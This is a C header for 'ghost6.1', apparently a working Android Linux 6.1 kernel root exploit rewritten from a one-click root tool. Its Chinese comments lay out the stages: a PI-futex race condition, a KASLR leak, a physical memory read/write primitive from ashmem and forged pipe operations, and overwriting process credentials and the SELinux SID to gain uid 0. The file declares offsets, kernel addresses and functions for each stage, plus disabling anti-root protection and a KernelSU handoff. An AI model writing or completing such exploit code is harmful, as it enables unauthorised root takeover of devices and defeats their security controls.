/* ghost6.1 — 6.1 内核 uid=0 链：按 一键root v1.6(glpreload) 的链路重写
 * 从零开始写，不继承旧的 chain_brm/chain_honor 任何结构。
 * 阶段：race -> kaslr -> physrw -> find_task -> patch_cred -> handoff(ksu_stage.sh)
 */
#ifndef GHOST_H
#define GHOST_H

#include <stdarg.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>

#define GHOST_PAGE 4096ULL
#define GHOST_DM_BASE_DEFAULT 0xffffffc000000000ULL  /* arm64 直接映射基址(未加 KASLR) */
#define GHOST_KIMAGE_DEFAULT 0xffffffc008000000ULL   /* GKI vmlinux 链接基址 */
#define GHOST_FULLCAP 0x1ffffffffffULL               /* (1<<41)-1，41 个 cap 位 */

/* ---- per-build 常量（tools/gen-ghost-map.py 生成）---- */
typedef struct {
    uint32_t key;    /* ip & 0x1fffff */
    int64_t delta;   /* base = ip + delta */
} ghost_fp;

typedef struct {
    const char *release;
    uint64_t init_task;
    uint64_t selinux_state;
    uint64_t root_user;
    uint64_t init_user_ns;
    /* 伪造 pipe_buf_operations 用到的内核文字地址（6 个） */
    uint64_t fops[6];
    /* 6.1 cred/task 布局（GKI android14-11 同源，逐项已对账） */
    uint32_t task_real_cred;  /* 0x830 */
    uint32_t task_cred;       /* 0x838 */
    uint32_t task_pid;        /* 0xe0  */
    uint32_t task_tgid;       /* 0xe4  */
    uint32_t task_comm;       /* 0x848 */
    uint32_t task_tasks;      /* task_struct.tasks 链表偏移（由 BTF 生成，未知为 0）*/
    uint32_t cred_uid;        /* 0x04  */
    uint32_t cred_securebits; /* 0x24  */
    uint32_t cred_caps;       /* 0x28  */
    uint32_t cred_security;   /* 0x78  */
    uint32_t cred_size;       /* 0xb0  */
    /* 竞态锚点（全部为 KIMAGE 基址下的绝对地址，运行期 +slide）
     *   [0] fake_lock_addr  [1] stage1 tri.left  [2] stage2 tri.left
     *   [3] sig_enforce     [4] data_addr 锚点(.data/.bss 页)
     * 任一为 0 表示该 build 未标定 → 载荷直接拒跑（不猜、不写 4 KiB） */
    uint64_t race[5];
    int nfp;
    const ghost_fp *fp;
} ghost_map;

extern const ghost_map *g_map;               /* 选中的 build（map_6.1.h 里的 ghost_map_pick 选） */
extern char g_release[128];

/* ---- 运行时全局 ---- */
typedef struct {
    int fd_ashmem;       /* 伪造 pipe 用的 ashmem fd */
    int fd_pipe[2];
    uint64_t slide;      /* KASLR 偏移 = base_runtime - GHOST_KIMAGE_DEFAULT */
    uint64_t kbase;      /* 内核运行基址 */
    uint64_t page_off;   /* page_offset_base（直接映射基址，含 slide） */
    uint64_t init_task;  /* 运行期 init_task 地址（已加 slide） */
    int h;               /* physrw 句柄（与参考实现同语义，占位为 fd_ashmem） */
    int verbose;
} ghost_ctx;
extern ghost_ctx g;

/* ---- log ---- */
void g_log(const char *fmt, ...);
void g_dbg(const char *fmt, ...);
#define LOG(...) g_log(__VA_ARGS__)
#define DBG(...) do { if (g.verbose) g_dbg(__VA_ARGS__); } while (0)

/* ---- util ---- */
int  g_read_file(const char *p, char *buf, size_t n);
int  g_write_file(const char *p, const char *s);
int  cpubind_init(void);
int  cpubind_bind(int cpu);
void cpubind_shutdown(void);
int  sched_setattr_tid(int tid, int policy);
void disable_rseq_for_thread(void);
int  futex_op(uint32_t *uaddr, int op, int val, void *timeout, uint32_t *uaddr2, int val3);
int  open_ashmem_device(void);
long g_syscall(long n, long a, long b, long c, long d, long e, long f);

/* ---- kaslr ---- */
int  get_kaslr_offset(uint64_t *out_base);
/* preflight：小样本验证 perf 可用并报候选基址（不改 g 的稳定状态） */
int  perf_selftest(void);
uint64_t ghost_slide(void);

/* 未标定档案的占位初值：载荷检测到全 0 就拒跑（exit 2），不猜地址 */
#define GHOST_FOPS_NONE {0,0,0,0,0,0}
#define GHOST_RACE_NONE {0,0,0,0,0}

/* ---- rw（ashmem ioctl 原语，照参考 kernel_read_data/write_data）---- */
int  install_pipe_physrw(int fd);          /* 自校验：读 init_task->comm == "swapper/" */
int  kernel_read_data(int h, uint64_t addr, void *buf, size_t len);   /* 0=ok */
int  kernel_write_data(int h, uint64_t addr, const void *buf, size_t len);
int  kernel_read64(int h, uint64_t addr, uint64_t *out);
int  ghost_boot_page_off(void);            /* data_addr：从内核读 page_offset_base */
void reset_pipe_attempt(void);
int  sysctl_read(const char *path, uint64_t *out);
void sysctl_destroy(void);

/* ---- race：三线程 PI-futex 竞态（照 0x626218/0x626414/0x62669c/0x625edc/0x627a98）---- */
int  ghostlock_main(void);
void ghost_stop(void);
long ppoll_from_regs(const uint64_t *regs);
void sig_stack_copy(void);

/* 参考全局（glpreload 0x636f38..0x637250）→ 同名 g_* */
extern volatile int g_stage;          /* 0x636fd8 */
extern uint64_t g_cfg[3];             /* 0x636fa8 */
extern uint64_t g_fake_lock_addr;     /* 0x636fa0 里存的值 */
extern uint8_t  g_fops[0x110];        /* 0x637038 */
extern uint8_t  g_sig_waiter[0x58];   /* 0x636f48 */
extern uint32_t g_f_pi_chain, g_waiter_ready, g_owner_started, g_waiter_waiting;
extern uint32_t g_f_wait, g_f_pi_target, g_route_done;
extern uint32_t g_consume_go, g_consume_enter_sched, g_sched_stop, g_consume_stop;
extern uint32_t g_waiter_tid, g_consume_calls, g_consume_sched_ok;
extern uint32_t g_owner_alive, g_owner_stop;
extern pthread_t g_run_owner_thr;     /* 0x637008 */
extern uint32_t g_run_owner_valid;    /* 0x637010 */

/* ---- cred ---- */
uint64_t find_task_by_tgid(int h, int tgid);
int  patch_cred_identity(int h, uint64_t cred);
int  patch_cred_sid(int h, uint64_t cred);
int  patch_cred_object(int h, uint64_t cred);
int  install_android_root(void);
void disable_antiroot_mod(void);

int is_kptr(uint64_t p);

/* ---- handoff ---- */
int  handoff_ksu(const char *mgr, const char *stage, const char *app_root);
#endif